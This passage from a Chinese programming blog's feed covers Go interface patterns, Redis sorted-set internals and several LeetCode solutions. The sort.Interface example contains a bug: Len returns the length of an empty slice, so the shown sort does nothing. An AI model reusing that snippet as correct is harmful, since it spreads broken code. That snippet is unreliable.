punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%s:%d"</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> b<span class="token punctuation">.</span>Score<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> Languages <span class="token punctuation">[</span><span class="token punctuation">]</span>BestLanguage<span class="token comment">// 实现了sort的Interface，不知道是怎么排序的，但拥有了排序的能力</span><span class="token keyword">func</span> <span class="token punctuation">(</span>l Languages<span class="token punctuation">)</span> <span class="token function">Len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">len</span><span class="token punctuation">(</span>Languages<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>l Languages<span class="token punctuation">)</span> <span class="token function">Less</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Score <span class="token operator">></span> l<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>Score<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>l Languages<span class="token punctuation">)</span> <span class="token function">Swap</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> l<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    languages <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>BestLanguage<span class="token punctuation">&#123;</span>        <span class="token punctuation">&#123;</span><span class="token string">"Chinese"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token string">"English"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token string">"Japanese"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>languages<span class="token punctuation">)</span>    sort<span class="token punctuation">.</span><span class="token function">Sort</span><span class="token punctuation">(</span><span class="token function">Languages</span><span class="token punctuation">(</span>languages<span class="token punctuation">)</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>languages<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// Return concrete types, receive interfaces as parameter.</span><span class="token keyword">func</span> <span class="token function">ConvertInterfaceToString</span><span class="token punctuation">(</span>v <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> vstr <span class="token builtin">string</span>    <span class="token keyword">switch</span> v<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token keyword">type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token builtin">int</span><span class="token punctuation">:</span>        vstr <span class="token operator">=</span> strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">case</span> <span class="token builtin">int32</span><span class="token punctuation">:</span>        vstr <span class="token operator">=</span> strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span><span class="token function">int</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">case</span> <span class="token builtin">int64</span><span class="token punctuation">:</span>        vstr <span class="token operator">=</span> strconv<span class="token punctuation">.</span><span class="token function">FormatInt</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int64</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">case</span> <span class="token builtin">float64</span><span class="token punctuation">:</span>        vstr <span class="token operator">=</span> strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span><span class="token function">int</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">float64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">case</span> <span class="token builtin">string</span><span class="token punctuation">:</span>        vstr <span class="token operator">=</span> v<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> vstr<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="hiding-implement-detail"><a href="#hiding-implement-detail" class="headerlink" title="hiding implement detail"></a>hiding implement detail</h4><p>三个函数返回的具体 struct （都实现了 Context interface），但是对于使用者来说是完全无感知的。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> Context <span class="token keyword">interface</span> <span class="token punctuation">&#123;</span>    <span class="token function">Deadline</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>deadline time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> ok <span class="token builtin">bool</span><span class="token punctuation">)</span>    <span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;-</span><span class="token keyword">chan</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">error</span>    <span class="token function">Value</span><span class="token punctuation">(</span>key <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// ------------------</span><span class="token keyword">type</span> cancelCtx <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    Context    mu       sync<span class="token punctuation">.</span>Mutex    done     <span class="token keyword">chan</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    children <span class="token keyword">map</span><span class="token punctuation">[</span>canceler<span class="token punctuation">]</span><span class="token keyword">struct</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    err      <span class="token builtin">error</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">WithCancel</span><span class="token punctuation">(</span>parent Context<span class="token punctuation">)</span> <span class="token punctuation">(</span>ctx Context<span class="token punctuation">,</span> cancel CancelFunc<span class="token punctuation">)</span>    <span class="token comment">//返回 cancelCtx</span><span class="token keyword">type</span> timerCtx <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    cancelCtx    timer <span class="token operator">*</span>time<span class="token punctuation">.</span>Timer    deadline time<span class="token punctuation">.</span>Time<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">WithDeadline</span><span class="token punctuation">(</span>parent Context<span class="token punctuation">,</span> deadline time<span class="token punctuation">.</span>Time<span class="token punctuation">)</span> <span class="token punctuation">(</span>Context<span class="token punctuation">,</span> CancelFunc<span class="token punctuation">)</span> <span class="token comment">//返回 timerCtx</span><span class="token keyword">type</span> valueCtx <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    Context    key<span class="token punctuation">,</span> val <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">WithValue</span><span class="token punctuation">(</span>parent Context<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> Context    <span class="token comment">//返回 valueCtx</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="providing-interception-points"><a href="#providing-interception-points" class="headerlink" title="providing interception points"></a>providing interception points</h4><p>实现RoundTripper接口，可以在http请求前后写入自己的逻辑，如apm，jaeger的打点。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> http<span class="token keyword">type</span> RoundTripper <span class="token keyword">interface</span> <span class="token punctuation">&#123;</span>    <span class="token function">RoundTrip</span><span class="token punctuation">(</span><span class="token operator">*</span>Request<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>Response<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">WrapClient</span><span class="token punctuation">(</span>c <span class="token operator">*</span>http<span class="token punctuation">.</span>Client<span class="token punctuation">)</span> <span class="token operator">*</span>http<span class="token punctuation">.</span>Client <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> c <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        c <span class="token operator">=</span> http<span class="token punctuation">.</span>DefaultClient    <span class="token punctuation">&#125;</span>    copied <span class="token operator">:=</span> <span class="token operator">*</span>c    copied<span class="token punctuation">.</span>Transport <span class="token operator">=</span> <span class="token function">wrapRoundTripper</span><span class="token punctuation">(</span>copied<span class="token punctuation">.</span>Transport<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">&amp;</span>copied<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">wrapRoundTripper</span><span class="token punctuation">(</span>r http<span class="token punctuation">.</span>RoundTripper<span class="token punctuation">)</span> http<span class="token punctuation">.</span>RoundTripper <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> r <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        r <span class="token operator">=</span> http<span class="token punctuation">.</span>DefaultTransport    <span class="token punctuation">&#125;</span>    rt <span class="token operator">:=</span> <span class="token operator">&amp;</span>roundTripper<span class="token punctuation">&#123;</span>r<span class="token punctuation">:</span> r<span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> rt<span class="token punctuation">&#125;</span><span class="token keyword">type</span> roundTripper <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    r http<span class="token punctuation">.</span>RoundTripper<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>r <span class="token operator">*</span>roundTripper<span class="token punctuation">)</span> <span class="token function">RoundTrip</span><span class="token punctuation">(</span>req <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>http<span class="token punctuation">.</span>Response<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// do something</span>  resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> r<span class="token punctuation">.</span>r<span class="token punctuation">.</span><span class="token function">RoundTrip</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token comment">// real request</span>  <span class="token comment">// do something</span>  <span class="token keyword">return</span> resp<span class="token punctuation">,</span> err<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="值接收-or-指针接收"><a href="#值接收-or-指针接收" class="headerlink" title="值接收 or 指针接收"></a>值接收 or 指针接收</h3><p>实现接口的时候应该用值还是指针？</p><ol><li>赋值时必须用指针。</li><li>初始化为指针类型，编译指定没问题。</li><li>❎表示编译不通过，因为对象没有声明接口的全部方法。</li><li>指针类型没有声明全部，但是能编译通过，因为Go自己做了一些转换。</li></ol><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> Animal <span class="token keyword">interface</span> <span class="token punctuation">&#123;</span>    <span class="token function">Eat</span><span class="token punctuation">(</span>food <span class="token builtin">string</span><span class="token punctuation">)</span>    <span class="token function">Say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// 全部值</span><span class="token keyword">type</span> Dog <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    food <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d Dog<span class="token punctuation">)</span> <span class="token function">Eat</span><span class="token punctuation">(</span>food <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    d<span class="token punctuation">.</span>food <span class="token operator">=</span> food<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d Dog<span class="token punctuation">)</span> <span class="token function">Say</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"dog like "</span><span class="token punctuation">,</span> d<span class="token punctuation">.</span>food<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// 全部指针</span><span class="token keyword">type</span> Cat <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    food <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Cat<span class="token punctuation">)</span> <span class="token function">Eat</span><span class="token punctuation">(</span>food <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    d<span class="token punctuation">.</span>food <span class="token operator">=</span> food<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Cat<span class="token punctuation">)</span> <span class="token function">Say</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"cat like "</span><span class="token punctuation">,</span> d<span class="token punctuation">.</span>food<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// 有值、有指针</span><span class="token keyword">type</span> Fish <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    food <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Fish<span class="token punctuation">)</span> <span class="token function">Eat</span><span class="token punctuation">(</span>food <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    d<span class="token punctuation">.</span>food <span class="token operator">=</span> food<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d Fish<span class="token punctuation">)</span> <span class="token function">Say</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"fish like "</span><span class="token punctuation">,</span> d<span class="token punctuation">.</span>food<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> dog Animal <span class="token operator">=</span> Dog<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">var</span> dog Animal <span class="token operator">=</span> <span class="token operator">&amp;</span>Dog<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">var</span> dog Animal <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span>    dog<span class="token punctuation">.</span><span class="token function">Eat</span><span class="token punctuation">(</span><span class="token string">"bone"</span><span class="token punctuation">)</span>    dog<span class="token punctuation">.</span><span class="token function">Say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// dog like    # 没吃上，赋值失败</span>    ❎ <span class="token keyword">var</span> cat Animal <span class="token operator">=</span> Cat<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token comment">//var cat Animal = &amp;Cat&#123;&#125;</span>    <span class="token keyword">var</span> cat Animal <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span>Cat<span class="token punctuation">)</span>    cat<span class="token punctuation">.</span><span class="token function">Eat</span><span class="token punctuation">(</span><span class="token string">"fish"</span><span class="token punctuation">)</span>    cat<span class="token punctuation">.</span><span class="token function">Say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// cat like  fish</span>    ❎ <span class="token keyword">var</span> fish Animal <span class="token operator">=</span> Fish<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">var</span> fish Animal <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span>Fish<span class="token punctuation">)</span>    fish<span class="token punctuation">.</span><span class="token function">Eat</span><span class="token punctuation">(</span><span class="token string">"small fish"</span><span class="token punctuation">)</span>    fish<span class="token punctuation">.</span><span class="token function">Say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// fish like  small fish</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="http://legendtkl.com/2017/06/12/understanding-golang-interface/">http://legendtkl.com/2017/06/12/understanding-golang-interface/</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis-为什么使用跳表?</title>
      <link href="/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-06-21-Redis-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8%E8%B7%B3%E8%A1%A8/"/>
      <url>/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-06-21-Redis-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8%E8%B7%B3%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="为什么有可比性"><a href="#为什么有可比性" class="headerlink" title="为什么有可比性"></a>为什么有可比性</h4><p>它们都是用于解决数据集合的查找问题，即根据指定的key，快速查到它所在的位置或者对应的value。</p><h4 id="Redis用跳表不用B-树的原因"><a href="#Redis用跳表不用B-树的原因" class="headerlink" title="Redis用跳表不用B+树的原因"></a>Redis用跳表不用B+树的原因</h4><p>redis是内存数据库，儿B+树是为了mysql这种io数据库准备的。B+树每个节点的数量都是一个mysql分区页的大小。</p><h4 id="数据结构对比"><a href="#数据结构对比" class="headerlink" title="数据结构对比"></a>数据结构对比</h4><table><thead><tr><th>数据结构</th><th>实现原理</th><th>查询方式</th><th>查找</th><th>存储</th><th>插入删除</th></tr></thead><tbody><tr><td>Hash</td><td>哈希表</td><td>单key</td><td>O(1)</td><td>除数据外没有额外存储</td><td>O(1)</td></tr><tr><td>B+树</td><td>平衡二叉树扩展而来</td><td>单key，范围，分页</td><td>O(logn)</td><td>数据，左右指针，页节点指针</td><td>O(logn)</td></tr><tr><td>跳表</td><td>有序链表扩展而来</td><td>单key，分页</td><td>O(logn)</td><td>数据，指针，每个节点指针&lt;2，所以占用空间比B+树小</td><td>O(logn)</td></tr></tbody></table><h4 id="redis-SortedSet底层数据结构"><a href="#redis-SortedSet底层数据结构" class="headerlink" title="redis SortedSet底层数据结构"></a>redis SortedSet底层数据结构</h4><p> zset底层的存储结构包括ziplist或skiplist，在同时满足以下两个条件的时候使用ziplist，其他时候使用skiplist，两个条件如下：</p><ul><li>有序集合保存的元素数量小于128个</li><li>有序集合保存的所有元素的长度小于64字节</li></ul><p> 当ziplist作为zset的底层存储结构时候，每个集合元素使用两个紧挨在一起的压缩列表节点来保存，第一个节点保存元素的成员，第二个元素保存元素的分值。</p><p> 当skiplist作为zset的底层存储结构的时候，使用skiplist按序保存元素及分值，使用dict来保存元素和分值的映射关系。</p>]]></content>
      
      
      <categories>
          
          <category> 中间件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-pprof</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-05-06-Golang-pprof/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-05-06-Golang-pprof/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-GMP原理与调度分析</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-05-06-Golang-GMP%E5%8E%9F%E7%90%86%E4%B8%8E%E8%B0%83%E5%BA%A6%E5%88%86%E6%9E%90/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-05-06-Golang-GMP%E5%8E%9F%E7%90%86%E4%B8%8E%E8%B0%83%E5%BA%A6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十万个为什么</title>
      <link href="/uncatesgorized/2021-04-15-%E5%8D%81%E4%B8%87%E4%B8%AA%E4%B8%BA%E4%BB%80%E4%B9%88/"/>
      <url>/uncatesgorized/2021-04-15-%E5%8D%81%E4%B8%87%E4%B8%AA%E4%B8%BA%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<h3 id="不懂就问"><a href="#不懂就问" class="headerlink" title="不懂就问"></a>不懂就问</h3><p>记录遇到了但是并不能立马找到答案的问题，大佬们既然这样做了，一定有它的道理。</p><h4 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h4><ul><li>redis pipeline底层实现是队列，队列先进先出的特性，保证了数据的顺序性。pipeline默认同步个数为53个，也就是说args累加到53条数据时会把数据提交。为什么是53？</li></ul><h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><ul><li>Mysql  默认最大连接数上限为151，如果超过会报错：&#x3D;&#x3D;MySQL: ERROR 1040: Too many connections&#x3D;&#x3D;，5.5+默认最大连接数都是151，上限为100000。为什么是151？</li></ul><h4 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h4><ul><li>sort在排序时会根据数据量不同选择不同的方法，元素个数小于等于12时，会选择希尔排序。为什么是12？</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-206-反转链表</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-04-14-LeetCode-206-%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-04-14-LeetCode-206-%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>反转一个单链表。 </p><p>示例: </p><p>输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL<br>输出: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL </p><p>进阶:<br>你可以迭代或递归地反转链表。你能否用两种方法解决这道题？ </p><p><a href="https://leetcode-cn.com/problems/reverse-linked-list/">https://leetcode-cn.com/problems/reverse-linked-list/</a></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>每个节点都只关心自己和下一个节点的指向关系</li><li>node.Next.Next &#x3D; node</li><li>node.Next &#x3D; nil</li></ul><pre class="line-numbers language-none"><code class="language-none">func reverseList(head *ListNode) *ListNode &#123;    if head&#x3D;&#x3D;nil&#123;        return nil    &#125;    return revert(head)&#125;func revert(head *ListNode) *ListNode &#123;    if head.Next&#x3D;&#x3D;nil&#123;        return head    &#125;    h :&#x3D; revert(head.Next)    head.Next.Next &#x3D; head    head.Next&#x3D;nil    return h&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-160-相交链表</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-04-14-LeetCode-160-%E7%9B%B8%E4%BA%A4%E9%93%BE%E8%A1%A8/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-04-14-LeetCode-160-%E7%9B%B8%E4%BA%A4%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>编写一个程序，找到两个单链表相交的起始节点。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-236-二叉树的最近公共祖先</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-04-13-LeetCode-236-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-04-13-LeetCode-236-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/</url>
      
        <content type="html"><![CDATA[<p>给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。</p><p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个节点 p、q，最近公共祖先表示为一个节点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”</p><p><a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree">https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree</a></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>情况1：p,q 在 root 两侧</li><li>情况2：p或q 等于 root, 且另一个节点在root的子树中</li></ul><pre class="line-numbers language-none"><code class="language-none">func lowestCommonAncestor(root, p, q *TreeNode) *TreeNode &#123;    if root &#x3D;&#x3D; nil || root &#x3D;&#x3D; q || root &#x3D;&#x3D; p &#123;        return root    &#125;    left :&#x3D; lowestCommonAncestor(root.Left, p, q)    right :&#x3D; lowestCommonAncestor(root.Right, p, q)    if left &#x3D;&#x3D; nil &#123;        return right    &#125;    if right &#x3D;&#x3D; nil &#123;        return left    &#125;    return root&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-215-数组中的第K个最大元素</title>
